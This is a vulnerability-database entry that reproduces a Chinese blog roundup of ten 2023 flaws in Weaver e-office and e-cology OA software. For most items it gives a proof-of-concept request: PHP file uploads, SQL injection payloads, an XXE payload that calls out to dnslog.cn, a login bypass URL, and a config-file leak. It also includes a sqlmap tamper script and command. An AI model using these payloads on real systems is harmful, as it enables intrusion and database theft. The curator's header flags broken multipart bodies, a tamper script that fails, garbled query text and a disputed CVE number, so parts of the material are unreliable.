---
title: "泛微e-office/e-cology 2023多漏洞合集"
product: "泛微e-office/e-cology"
record_type: "roundup"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: "CVE-2023-2523;CVE-2023-2648;QVD-2023-16177;CNVD-2023-12632;QVD-2023-9849"
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "不同子条目9.5、8/9及10.56/10.57/10.58/10.58.2补丁，不能统一version"
prerequisites: "各条声称前台/未认证"
side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
review_date: "2026-10-02"
identifier_role: "primary"
identifier_note: "来源编号存在未核实/冲突，未作为确认主编号：CVE-2023-15672"
source: "原收录资料；原始作者及出处待核实"
source_url: "https://mp.weixin.qq.com/s/QQ-0KEQR69UwwRtPLkDGzw"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/OA%E5%8A%9E%E5%85%AC/%E6%B3%9B%E5%BE%AEoa/2023%20%E6%B3%9B%E5%BE%AE%20OA%20%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86%EF%BC%88%E9%99%84%20POC%EF%BC%89.md"
id: "vw-ed9872f3aa0b9646ad252aa3"
entity_id: "ve-ed9872f3aa0b9646ad252aa3"
schema_version: "1"
---

# 泛微e-office/e-cology 2023多漏洞合集

## 条目说明

- 对象与具体问题：泛微e-office/e-cology；2023多漏洞合集
- 版本、配置及部署条件：不同子条目9.5、8/9及10.56/10.57/10.58/10.58.2补丁，不能统一version
- 认证与权限前提：各条声称前台/未认证
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。
- 编号待核：CVE-2023-15672。未核实的编号不作为本条确认主编号。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- FileDownloadForOutDoc的CVE-2023-15672标识需与官方源核对，不能凭此合集写入主库
- 多个multipart name/filename丢失、边界不匹配、缺头体空行；tamper返回resul未定义
- XXE EXP1仅空头，其他实体未声明完整；CheckServer只访问接口不能证明注入
- ofsLogin查询出现×tamp转码损坏；修复范围及文章列表序号紊乱
- 与多篇专项可做导航合集但逐接口独立对照，不整体按一个CVE合并

## 操作风险

现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。

## 技术资料与来源记录

> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/QQ-0KEQR69UwwRtPLkDGzw)

最近整理了 2023 年泛微 OA 存在的相关漏洞（附 POC）  

![](https://mmbiz.qpic.cn/mmbiz_jpg/n2rSqJSRAVxibng7uofM7anSF8GXbEDP7AiazgDJM3XCyAbSB0u481oYpLaSaGfjRYiaWWVkrwwVtFsk43u3qL72A/640?wx_fmt=jpeg)

*   泛微 E-Office 文件上传漏洞（CVE-2023-2523)1
    
*   泛微 E-Office 文件上传漏洞 (CVE-2023-2648)2
    
*   泛微 E-Cology SQL 注入漏洞 (CVE-2023-15672)3
    
*   泛微 E-Cology XXE 漏洞 (QVD-2023-16177)4
    
*   泛微 OA E-Cology9 未授权 SQL 注入漏洞 (CNVD-2023-12632)5
    
*   泛微 OA e-cology 前台接口 SQL 注入漏洞 7
    
*   泛微 e-cology  ofsLogin 任意用户登录漏洞 8
    
*   泛微 E-Cology /CheckServer.jsp 路径 SQL 注入漏洞 (QVD-2023-9849)9
    
*   泛微 E-Office UserSelect 未授权访问漏洞 10
    
*   泛微 OA E-Office mysql_config.ini 数据库信息泄漏漏洞
    

10

**1. 泛微 E-Office 文件上传漏洞（CVE-2023-2523)  
**

泛微 e-office 9.5 版本，源文件 App/Ajax/ajax.php?action=mobile_upload_save 的一些未知功能存在问题。参数 upload_quwan 的操作导致不受限制的上传，未经身份验证的恶意攻击者通过上传恶意文件，从而获取目标服务器的控制权限。

**漏洞编号**：CVE-2023-2523

**漏洞类型**：任意文件上传

**影响版本**：泛微 e-office 9.5 版本

**POC**：

```
POST/Emobile/App/Ajax/ajax.php?action=mobile_upload_save  HTTP/1.1 
Host:your-ip  
Cache-Control:max-age=0  
Upgrade-Insecure-Requests:1  
Origin:null  
Content-Type:multipart/form-data; boundary=----WebKitFormBoundarydRVCGWq4Cx3Sq6tt  
Accept-Encoding:gzip, deflate
Accept-Language:en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7
Connection:close
------WebKitFormBoundarydRVCGWq4Cx3Sq6tt
Content-Disposition:form-data; 
Content-Type:image/jpeg
<?phpphpinfo();?>
------WebKitFormBoundarydRVCGWq4Cx3Sq6tt
Content-Disposition:form-data; 
Content-Type:application/octet-stream
------WebKitFormBoundarydRVCGWq4Cx3Sq6tt--

```

**修复建议**：

目前官方已修复以上漏洞，建议升级更新到安全版本。  

**2. 泛微 E-Office 文件上传漏洞 (CVE-2023-2648)**

泛微 e-office 9.5 版本源文件 / inc/jquery/uploadify/uploadify.php 存在问题，对参数 Filedata 的操作会导致不受限制的上传，未经身份验证的恶意攻击者通过上传恶意文件，从而获取目标服务器的控制权限。

**漏洞编号**：CVE-2023-2648

**漏洞类型**：任意文件上传  

**影响版本**：泛微 e-office 9.5 版本

**POC**：

```http
POST /inc/jquery/uploadify/uploadify.php  HTTP/1.1
Host:***
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: null
Content-Type: multipart/form-data; boundary=-WebKitFormBoundarydRVCGWq4Cx3Sq6tt  
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7
Connection: close
------WebKitFormBoundarydRVCGWq4Cx3Sq6tt
Content-Disposition: form-data; 
Content-Type: image/jpeg
<?php phpinfo();?>
------WebKitFormBoundarydRVCGWq4Cx3Sq6tt

```

**修复建议**：  

目前官方已修复以上漏洞，建议升级更新到安全版本。  

**3. 泛微 E-Cology SQL 注入漏洞 (CVE-2023-15672)**

泛微 e-cology 未对用户的输入进行有效的过滤，直接将其拼接进了 SQL 查询语句中，导致系统出现 SQL 注入漏洞。远程未授权攻击者可利用此漏洞获取敏感信息，进一步利用可能获取目标系统权限等。

**漏洞编号**：CVE-2023-15672

**漏洞类型**：SQL 注入  

**影响版本**：Ecology 9.x 补丁版本 < 10.58.0；Ecology 8.x 补丁版本 < 10.58.0  

**POC**：  

```http
GET /weaver/weaver.file.FileDownloadForOutDoc/?fileid=123+WAITFOR+DELAY+'0:0:5'&isFromOutImg=1 HTTP/1.1
Host:***
Accept:*/*
Connection: close

```

sqlmap 利用：  

请求遍历随机数去配合 payload 实现注入的 tamper 脚本

```
import os,re,random
from lib.core.enums import PRIORITY
from lib.core.common import singleTimeWarnMessage
from lib.core.enums import DBMS
priority = PRIORITY.HIGHEST
def tamper(payload, **kwargs):
    result = ""
    num = random.randint(1,2**27)
    result = str(num)+payload
    return resul

```

尝试注入：  

```
python3 sqlmap.py -r post.txt --tamper=ecology_sql_random.py --batch --dbs

```

**修复建议**：

目前官方已发布安全补丁，建议受影响用户尽快升级至 10.58 及以上版本。  

**4. 泛微 E-Cology XXE 漏洞 (QVD-2023-16177)**

泛微 e-cology 某处功能点最初针对用户输入的过滤不太完善，导致在处理用户输入时可触发 XXE。攻击者可利用该漏洞列目录、读取文件，甚至可能获取应用系统的管理员权限。

**漏洞编号**：QVD-2023-16177

**漏洞类**型：XXE  

**影响版本**：泛微 EC 9.x 且补丁版本 < 10.58.2；泛微 EC 8.x 且补丁版本 < 10.58.2  

**POC**：  

```http
POST /rest/ofs/ReceiveCCRequestByXml HTTP/1.1
Host:***
Content-Type: application/xml
<M><syscode>&send;</syscode></M>

```

**EXP1**:  

```http
POST /rest/ofs/ReceiveCCRequestByXml HTTP/1.1
Host:****
Content-Type: application/xml

```

**EXP2**：  

```http
POST /rest/ofs/deleteUserRequestInfoByXml HTTP/1.1
Host:***
Content-Type: application/xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE syscode SYSTEM "http://dnslog.cn">
<M><syscode>&send;</syscode></M>

```

**修复建议**：  

1. 限制访问来源地址，如非必要，不要将系统开放在互联网上。  

2. 目前官方已发布 10.58.2 来修复此漏洞，建议受影响用户更新至 10.58.2  

```
https://www.weaver.com.cn/cs/securityDownload.html#

```

**5. 泛微 OA E-Cology9 未授权 SQL 注入漏洞 (CNVD-2023-12632)**

泛微新一代移动办公平台 e-cology 不仅组织提供了一体化的协同工作平台, 将组织事务逐渐实现全程电子化, 改变传统纸质文件、实体签章的方式。泛微 OA E-Cology 平台 browser.jsp 处存在 SQL 注入漏洞，攻击者通过漏洞可以获取服务器数据库权限。

**漏洞编号**：CNVD-2023-12632

**漏洞类型**：SQL 注入  

**影响版本**：泛微 e-cology V9 < 10.56

**POC**：  

```http
POST /mobile/plugin/browser.jsp HTTP/1.1
Host:***
Upgrade-Insecure-Requests: 1
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
x-forwarded-for:***
x-originating-ip:***
x-remote-ip: ***
x-remote-addr:***
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 649
isDis=1&browserTypeId=269&keyword=%2525%2536%2531%2525%2532%2537%2525%2532%2530%2525%2537%2535%2525%2536%2565%2525%2536%2539%2525%2536%2566%2525%2536%2565%2525%2532%2530%2525%2537%2533%2525%2536%2535%2525%2536%2563%2525%2536%2535%2525%2536%2533%2525%2537%2534%2525%2532%2530%2525%2533%2531%2525%2532%2563%2525%2532%2537%2525%2532%2537%2525%2532%2562%2525%2532%2538%2525%2535%2533%2525%2534%2535%2525%2534%2563%2525%2534%2535%2525%2534%2533%2525%2535%2534%2525%2532%2530%2525%2534%2530%2525%2534%2530%2525%2535%2536%2525%2534%2535%2525%2535%2532%2525%2535%2533%2525%2534%2539%2525%2534%2566%2525%2534%2565%2525%2532%2539%2525%2532%2562%2525%2532%2537

```

**修复建议**：

升级至安全版本，官方修复方案  

```
https://www.weaver.com.cn/cs/securityDownload.asp#

```

**6. 泛微 OA e-cology 前台接口 SQL 注入漏洞**

由于 OA 系统的 WorkflowCenterTreeData 接口在收到用户输入的时候未进行安全过滤，oracle 数据库传入恶意 SQL 语句，导致 SQL 漏洞。

**漏洞编号**：无

**漏洞类型**：SQL 注入

**影响版本**：使用 oracle 数据库的泛微 e-cology OA 系统

**POC**：  

```http
POST /mobile/browser/WorkflowCenterTreeData.jsp?node=wftype_1&scope=2333 HTTP/1.1
Host:***
Content-Type: application/x-www-form-urlencoded
Connection: close
Upgrade-Insecure-Requests: 1
formids=11111111111)))%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0dunion select NULL,value from v$parameter order by (((1

```

**修复建议**：官网已更新补丁  

**7. 泛微 e-cology  ofsLogin 任意用户登录漏洞**

泛微 e-cology 是一套兼具企业信息门户、知识文档管理、工作流程管理、人力资源管理、客户关系管理、项目管理、财务管理、资产管理、供应链管理、数据中心功能的企业大型协同管理平台。泛微 e-cology 前台任意用户登录漏洞：泛微 e-cology9 部分版本中存在前台任意用户登录漏洞。该漏洞允许未经身份验证的攻击者通过发送构造的请求触发漏洞，成功利用此漏洞的攻击者可登录任意用户。

**漏洞编号**：无

**漏洞类型**：认证绕过

**影响版本**：部分 e-cology9 并且补丁版本 < 10.57

**POC**：  

```
/mobile/plugin/1/ofsLogin.jsp?gopage=/wui/index.html&loginTokenFromThird=866fb3887a60239fc112354ee7ffc168&receiver=1&syscode=1×tamp

```

**修复建议**：

目前，官方已发布修复建议，建议受影响的用户尽快升级至最新版本的补丁。  

```
https://www.weaver.com.cn/cs/securityDownload.asp#

```

**8. 泛微 E-Cology /CheckServer.jsp 路径 SQL 注入漏洞 (QVD-2023-9849)**

泛微 Ecology OA 系统对用户传入的数据过滤处理不当，导致存在 SQL 注入漏洞，未经过身份认证的远程攻击者可利用此漏洞执行任意 SQL 指令，从而窃取数据库敏感信息。

**漏洞编号**：QVD-2023-9849

**漏洞类型**：SQL 注入  

**影响版本**：泛微 Ecology 9.x <= v10.56；泛微 Ecology 8.x <= v10.56

**POC**：  

```http
GET /mobile/plugin/CheckServer.jsp?type=mobileSetting HTTP/1.1
Host: ***
Connection: close

```

访问 / mobile/plugin/CheckServer.jsp?type=mobileSetting ，返回状态码 200 且参数值为 {“error”;”system error”}

**修复建议**：

目前官方已发布安全补丁，建议受影响用户尽快升级至 10.57 及以上版本。

```
https://www.weaver.com.cn/cs/securityDownload.asp#

```

**9. 泛微 E-Office UserSelect 未授权访问漏洞**

Weaver E-Office 是中国泛微科技（Weaver）公司的一个协同办公系统。泛微 OA E-Office UserSelect 接口存在未授权访问漏洞，通过漏洞攻击者可以获取敏感信息。

**漏洞编号**：无

**漏洞类型**：未授权访问

**影响版本**：泛微 OA E-Office

**POC**：  

```http
GET /UserSelect/ HTTP/1.1
Content-Type: application/josn

```

**修复建议**：

目前厂商已发布升级补丁以修复漏洞，补丁获取链接：

```
https://service.e-office.cn/download

```

**10. 泛微 OA E-Office mysql_config.ini 数据库信息泄漏漏洞**

泛微 E-Office mysql_config.ini 文件可直接访问，泄漏数据库账号密码等信息。  

**漏洞编号**：无  

**漏洞类型**：信息泄露  

**影响版本**：泛微 OA E-Office  

**POC**：

```http
GET /mysql_config.ini HTTP/1.1
Content-Type: application/josn

```

**修复建议**：

目前厂商已发布升级补丁以修复漏洞，补丁获取链接：

```
https://service.e-office.cn/download

```

![](https://mmbiz.qpic.cn/mmbiz_jpg/n2rSqJSRAVxibng7uofM7anSF8GXbEDP7SPyNaQ77MUVWyf4u2ia1lgZlHI0BaicTG3XLgOHEY4FBjKIdOgLp2ztw/640?wx_fmt=jpeg)

**本文版权归作者和微信公众号平台共有，重在学习交流，不以任何盈利为目的，欢迎转载。**

**由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，文章作者不为此承担任何责任。**公众号**内容中部分攻防技巧等只允许在目标授权的情况下进行使用，大部分文章来自各大安全社区，个人博客，如有侵权请立即联系公众号进行删除。若不同意以上警告信息请立即退出浏览！！！**

**敲敲小黑板：《刑法》第二百八十五条　【非法侵入计算机信息系统罪；非法获取计算机信息系统数据、非法控制计算机信息系统罪】违反国家规定，侵入国家事务、国防建设、尖端科学技术领域的计算机信息系统的，处三年以下有期徒刑或者拘役。违反国家规定，侵入前款规定以外的计算机信息系统或者采用其他技术手段，获取该计算机信息系统中存储、处理或者传输的数据，或者对该计算机信息系统实施非法控制，情节严重的，处三年以下有期徒刑或者拘役，并处或者单处罚金；情节特别严重的，处三年以上七年以下有期徒刑，并处罚金**。

---

> 来源：MrWQ/vulnerability-paper（https://github.com/MrWQ/vulnerability-paper）
